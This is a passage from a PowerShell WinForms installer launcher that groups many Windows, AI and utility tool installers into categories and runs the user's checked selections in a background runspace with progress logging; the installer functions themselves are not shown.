    @{ Name = "WinScript"; Func = { Run-WinScript } },
    @{ Name = "Coporton"; Func = { Run-Coporton } },
    @{ Name = "IDM Fixer"; Func = { Run-IDM } },
    @{ Name = "Sparkle"; Func = { Run-Sparkle } },
    @{ Name = "GHGrab (GitHub Grabber)"; Func = { Run-GHGrab } },
    @{ Name = "Tools Installer Setup"; Func = { Run-Setup } },
    @{ Name = "VPN"; Func = { Run-VPN } },
    @{ Name = "Tor Link"; Func = { Run-TorLink } },
	@{ Name = "Tork"; Func = { Install-Tork } },
    @{ Name = "YTDLP Frontend"; Func = { Run-YTDLPFrontend } },
    @{ Name = "Yoinks"; Func = { Run-Yoinks } }
)

Add-Category -Col 2 -Title "AI in PC" -Items @(
    @{ Name = "Agy"; Func = { Install-Agy } },
    @{ Name = "Opencode"; Func = { Install-Opencode } },
    @{ Name = "Cursor IDE"; Func = { Install-Cursoride } },
    @{ Name = "Google Desktop App"; Func = { Open-GoogleDesktopApp } },
    @{ Name = "LLM-Checker"; Func = { Run-LLMChecker } },
    @{ Name = "LLMFit"; Func = { Install-LLMFit } },
    @{ Name = "Ollama"; Func = { Install-Ollama } },
    @{ Name = "Claude Code"; Func = { Install-ClaudeCode } },
    @{ Name = "Claude Code Router"; Func = { Install-ClaudeCodeRouter } },
    @{ Name = "Codebuff"; Func = { Install-Codebuff } },
    @{ Name = "Omniroute"; Func = { Install-Omniroute } }
)

# Column 3 ---------------------------------------------------------------------
Add-Category -Col 3 -Title "System Tools" -Items @(
    @{ Name = "Winget"; Func = { Install-Winget } },
    @{ Name = "Everything Search"; Func = { Install-Everything } },
    @{ Name = "CMD Color 0a"; Func = { Set-CMD0A } },
    @{ Name = "RustDesk"; Func = { Install-RustDesk } },
    @{ Name = "HiBit Uninstaller"; Func = { Install-HiBit } },
    @{ Name = "Superfile"; Func = { Install-Superfile } },
    @{ Name = "Alacritty"; Func = { Install-Alacritty } },
    @{ Name = "Scrcpy GUI"; Func = { Install-Scrcpy } },
    @{ Name = "Cursor / Elegant"; Func = { Install-Cursor } },
    @{ Name = "VC++ Runtimes"; Func = { Install-VCC-Runtimes } },
    @{ Name = "DirectX Runtime"; Func = { Install-DirectX } }
)

Add-Category -Col 3 -Title "Productivity Apps" -Items @(
    @{ Name = "Office 365"; Func = { Install-Office365 } },
    @{ Name = "Chrome"; Func = { Install-Chrome } },
    @{ Name = "Zen Browser"; Func = { Install-Zen } },
    @{ Name = "OBS Studio"; Func = { Install-OBS } },
    @{ Name = "LocalSend"; Func = { Install-LocalSend } },
    @{ Name = "Notepad++"; Func = { Install-NotepadPP } },
    @{ Name = "ShareX"; Func = { Install-ShareX } },
    @{ Name = "qBittorrent"; Func = { Install-QBit } }
)

# Column 4 ---------------------------------------------------------------------
Add-Category -Col 4 -Title "Win Tools" -Items @(
    @{ Name = "TestDisk"; Func = { Install-TestDisk } },
    @{ Name = "FreeRecover"; Func = { Install-FreeRecover } },
    @{ Name = "Kickass Undelete"; Func = { Install-KickassUndelete } },
    @{ Name = "CPU-Z"; Func = { Install-CPUZ } },
    @{ Name = "HWiNFO"; Func = { Install-HWiNFO } },
    @{ Name = "GPU-Z"; Func = { Install-GPUZ } },
    @{ Name = "CrystalDiskInfo"; Func = { Install-CrystalDiskInfo } },
    @{ Name = "CrystalDiskMark"; Func = { Install-CrystalDiskMark } },
    @{ Name = "DriverStore Explorer"; Func = { Install-DriverStoreExplorer } },
    @{ Name = "Ventoy"; Func = { Install-Ventoy } },
    @{ Name = "Rufus"; Func = { Install-Rufus } },
    @{ Name = "AnyBurn"; Func = { Install-AnyBurn } }
    @{ Name = "Git Cloner"; Func = { Run-GitCloner } },
    @{ Name = "Downly"; Func = { Install-Downly } },
    @{ Name = "Monkeytype tui"; Func = { Run-MonkeytypeTui } }
)


# Let AutoScroll automatically compute the required virtual bounds
# based on the scaled locations of the child GroupBoxes.


# ============================================================
#  SECTION G: RUN SELECTED (non-blocking via Runspace)
# ============================================================

$script:BtnRun.Add_Click({

        # Gather checked items in their current visual order
        $selected = @($script:AllTasks | Where-Object { $_.CheckBox.Checked })

        if (-not $selected -or $selected.Count -eq 0) {
            [System.Windows.Forms.MessageBox]::Show(
                "No items are checked.`nPlease check at least one item before clicking Run Selected.",
                "Nothing Selected",
                [System.Windows.Forms.MessageBoxButtons]::OK,
                [System.Windows.Forms.MessageBoxIcon]::Information
            ) | Out-Null
            return
        }

        # Disable button while running
        $script:BtnRun.Enabled = $false
        $script:BtnRun.Text = "Running..."
        $script:ProgressBar.Value = 0
        $script:ProgressBar.Maximum = $selected.Count

        Write-Log ("=== Batch run started: {0} item(s) ===" -f $selected.Count) -Level Info

        # Share references into runspace
        $rsData = @{
            SelectedTasks = $selected
            LogBox        = $script:LogBox
            ProgressBar   = $script:ProgressBar
            StatusLabel   = $script:LblStatus
            RunButton     = $script:BtnRun
            CLR_TEXT      = $CLR_TEXT
            CLR_YELLOW    = $CLR_YELLOW
            CLR_GREEN     = $CLR_GREEN
            CLR_RED       = $CLR_RED
        }

        $rs = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspace()
        $rs.ApartmentState = "STA"
        $rs.ThreadOptions = "ReuseThread"
        $rs.Open()
        foreach ($k in $rsData.Keys) { $rs.SessionStateProxy.SetVariable($k, $rsData[$k]) }

        $ps = [System.Management.Automation.PowerShell]::Create()
        $ps.Runspace = $rs

        [void]$ps.AddScript({

                function Ui-Log {
                    param([string]$Msg, $Clr)
                    $ts = (Get-Date).ToString("HH:mm:ss")
                    $StatusLabel.Invoke([System.Action] {
                            $StatusLabel.ForeColor = $Clr
                            $StatusLabel.Text = "[$ts] $Msg"
                        })
                }

                $total = $SelectedTasks.Count
                $ok = 0
                $fail = 0

                for ($i = 0; $i -lt $total; $i++) {
                    $task = $SelectedTasks[$i]

                    $idx = $i    # capture for closure
                    $tName = $task.Name
                    $StatusLabel.Invoke([System.Action] {
                            $StatusLabel.Text = "Task $($idx+1) of $total : $tName"
                        })

                    Ui-Log -Msg "Running: $($task.Name) ..." -Clr $CLR_YELLOW

                    if ($null -eq $task -or $null -eq $task.Function) {
                        Ui-Log -Msg "FAILED:  $($task.Name) | Invalid action object." -Clr $CLR_RED
                        $fail++
                        continue
                    }
                    if ($task.Function -isnot [scriptblock] -and $task.Function -isnot [System.Management.Automation.ScriptBlock]) {
                        Ui-Log -Msg "FAILED:  $($task.Name) | Action is not executable." -Clr $CLR_RED
                        $fail++
                        continue
                    }
                    if ($task.Name -match "(?i)Portfolio") {
                        Ui-Log -Msg "Skipped: $($task.Name) (Not an installer)" -Clr $CLR_YELLOW
                        continue
                    }

                    try {
                        & $task.Function
                        Ui-Log -Msg "Done:    $($task.Name)" -Clr $CLR_GREEN
                        $ok++
                    }
                    catch {
                        Ui-Log -Msg "FAILED:  $($task.Name) | $($_.Exception.Message)" -Clr $CLR_RED
                        $fail++
                    }

                    $pVal = $i + 1
                    $ProgressBar.Invoke([System.Action] {
                            $ProgressBar.Value = [Math]::Min($pVal, $ProgressBar.Maximum)
                        })

                    Start-Sleep -Milliseconds 250
                }

                # Summary line
                $sumMsg = "=== Completed: $ok Successful  |  $fail Failed ==="
                $sumClr = if ($fail -gt 0) { $CLR_RED } else { $CLR_GREEN }
                Ui-Log -Msg $sumMsg -Clr $sumClr

                # Restore button
                $RunButton.Invoke([System.Action] {
                        $RunButton.Enabled = $true
                        $RunButton.Text = "Run Selected"
                    })
                $StatusLabel.Invoke([System.Action] {
                        $StatusLabel.Text = "Done   OK: $ok   Failed: $fail"
                    })

                # Summary dialog
                $RunButton.Invoke([System.Action] {
                        $icon = if ($fail -gt 0) {
                            [System.Windows.Forms.MessageBoxIcon]::Warning
                        }
                        else {
                            [System.Windows.Forms.MessageBoxIcon]::Information
                        }
                        [System.Windows.Forms.MessageBox]::Show(
                            "Batch run complete.`n`nSuccessful : $ok`nFailed     : $fail",
                            "Run Summary",
                            [System.Windows.Forms.MessageBoxButtons]::OK,
                            $icon
                        ) | Out-Null
                    })
            })

        [void]$ps.BeginInvoke()   # non-blocking; UI stays live
    })

# ============================================================
#  SECTION H: RESIZE HANDLER  (keep right-side controls tidy)
# ============================================================
$resizeHandler = {
        $w = $pnlHeader.Width
        $btnGithub.Location = New-Object System.Drawing.Point(($w - 256), 17)
        $chkSelectAll.Location = New-Object System.Drawing.Point(($w - 356), 17)
        $txtSearch.Location = New-Object System.Drawing.Point(($w - 166), 21)

        $rx = $pnlBottom.Width - 340
        $btnUpgradeAll.Location = New-Object System.Drawing.Point($rx, 8)
        $btnWingetUpgradeAll.Location = New-Object System.Drawing.Point(($rx + 110), 8)
        $script:BtnRun.Location = New-Object System.Drawing.Point(($rx + 220), 8)
        
        $script:LblStatus.Width = $rx - 20
    }
$form.Add_Resize($resizeHandler)
& $resizeHandler

# ============================================================
#  SECTION I: STARTUP MESSAGE AND LAUNCH
# ============================================================
$form.Add_Shown({
        $txtSearch.Focus()
        Write-Log "Tool Installer GUI ready - running as Administrator." -Level Success
        Write-Log "Tip: Check boxes next to items and press [Run Selected] for batch install." -Level Info
        Write-Log "Tip: Click any tool button to launch it immediately without queuing." -Level Info

        try {
            $darkMode = 1
            $osVersion = [Environment]::OSVersion.Version
            if ($osVersion.Major -ge 10) {
                try { [Native.DWM]::DwmSetWindowAttribute($form.Handle, 20, [ref]$darkMode, 4) }
                catch { try { [Native.DWM]::DwmSetWindowAttribute($form.Handle, 19, [ref]$darkMode, 4) } catch {} }
            }
        } catch {}
    })

[System.Windows.Forms.Application]::Run($form)

exit

